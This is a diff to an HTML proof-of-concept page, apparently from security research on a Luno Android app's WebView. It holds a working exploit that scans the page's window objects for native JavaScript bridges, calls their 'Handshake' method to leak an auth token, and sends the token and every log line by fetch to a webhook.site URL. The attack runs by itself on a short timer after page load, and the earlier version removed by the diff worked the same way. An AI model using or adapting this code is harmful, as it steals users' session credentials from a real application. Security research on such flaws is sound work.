@@ -3,46 +3,82 @@
 <head>
     <title>Luno Security Research PoC</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #121212; color: #00ff00; font-family: monospace; padding: 20px; word-wrap: break-word; }
+        .log { border-bottom: 1px solid #333; padding: 10px 0; }
+        .error { color: #ff5555; }
+        .success { color: #55ff55; font-weight: bold; }
+    </style>
 </head>
-<body style="background-color: #121212; color: white; font-family: sans-serif; padding: 20px;">
-    <h1>Exploit Running...</h1>
-    <p>Check Webhook.site for the Auth Token.</p>
+<body>
+    <h1>LUNO PWN ACTIVE</h1>
+    <div id="status" class="log">Initializing...</div>
+    <div id="logs"></div>
 
     <script>
-        // Use the bridge name from Smali (usually 'Android')
-        const bridge = window.Android || window.JSBridge;
+        const webhook = "https://webhook.site/de2d6db2-6ebd-4147-9658-abe4681aa0a4";
 
-        if (bridge) {
-            try {
-                // 1. Trigger the Handshake to leak field y0 (Auth Token)
-                bridge.invoke("Handshake", "req_123", "{}");
-                
-                // 2. We need to catch the data. Since the bridge is asynchronous, 
-                // we wrap the console or the bridge's response handler.
-                // This sends everything it finds to your Webhook.
-                
-                const reportToWebhook = (data) => {
-                    fetch("https://webhook.site/de2d6db2-6ebd-4147-9658-abe4681aa0a4", {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            type: "EXFILTRATED_TOKEN",
-                            payload: data
-                        })
-                    });
-                };
-
-                // Catching common JS bridge response patterns
-                window.onBridgeResponse = function(id, data) {
-                    reportToWebhook(data);
-                };
-
-            } catch (e) {
-                fetch("https://webhook.site/de2d6db2-6ebd-4147-9658-abe4681aa0a4?error=" + btoa(e.message));
-            }
-        } else {
-            document.write("<h2>Bridge NOT detected. Open this in the Luno WebView!</h2>");
+        function log(msg, isError = false) {
+            const div = document.createElement('div');
+            div.className = isError ? "log error" : "log";
+            div.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
+            document.getElementById('logs').prepend(div);
+            
+            // Exfiltrate log to Webhook
+            fetch(webhook + "?log=" + encodeURIComponent(msg), {mode: 'no-cors'});
         }
+
+        async function triggerExploit() {
+            // Possible Bridge Names found in Smali analysis
+            const bridgeNames = ['Android', 'JSBridge', 'Predictions', 'PredictionsBridge', 'LunoNative'];
+            let found = false;
+
+            document.getElementById('status').innerText = "Scanning window objects...";
+
+            for (let name of bridgeNames) {
+                if (window[name] && window[name].invoke) {
+                    log("DETECTED BRIDGE: " + name, true);
+                    found = true;
+                    try {
+                        log("Attempting Handshake on " + name + "...");
+                        // This triggers the Smali zh/f1 method to return field y0
+                        window[name].invoke("Handshake", "req_pwn", "{}");
+                        log("Handshake Sent! Check Webhook for y0 token.", true);
+                    } catch (e) {
+                        log("Error invoking " + name + ": " + e.message, true);
+                    }
+                }
+            }
+
+            if (!found) {
+                log("Primary bridges not found. Searching all window properties...");
+                for (var prop in window) {
+                    if (typeof window[prop] === 'object' && window[prop] !== null && window[prop].invoke) {
+                        log("Found potential bridge: " + prop);
+                        window[prop].invoke("Handshake", "req_pwn", "{}");
+                    }
+                }
+                document.getElementById('status').innerHTML = "<h2 style='color:red'>BRIDGE NOT DETECTED YET</h2>";
+            } else {
+                document.getElementById('status').innerHTML = "<h2 style='color:lime'>EXPLOIT TRIGGERED</h2>";
+            }
+        }
+
+        // Catch the response from the app (the token)
+        window.onBridgeResponse = function(id, data) {
+            log("RECEIVED DATA: " + JSON.stringify(data), true);
+            fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    msg: "PWNED_TOKEN_EXFILTRATED",
+                    data: data
+                })
+            });
+        };
+
+        // Run exploit after a short delay to ensure injection
+        setTimeout(triggerExploit, 1500);
     </script>
 </body>
 </html>
